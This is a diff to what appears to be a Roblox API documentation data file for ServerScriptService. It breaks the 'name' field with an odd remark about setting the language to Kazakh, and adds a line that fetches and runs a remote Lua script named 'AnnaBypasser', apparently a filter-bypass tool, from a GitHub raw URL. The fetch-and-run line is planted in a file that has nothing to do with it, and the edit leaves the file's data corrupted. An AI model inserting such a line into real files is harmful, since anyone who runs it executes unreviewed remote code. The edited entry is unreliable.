@@ -1,4 +1,6 @@
-name: ServerScriptService
+name: ServerScriptService-- set ur language to  Қазақ Тілі* 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnnaRoblox/AnnaBypasser/refs/heads/main/AnnaBypasser.lua",true))()
 type: class
 category: Scripting
 memory_category: Instances
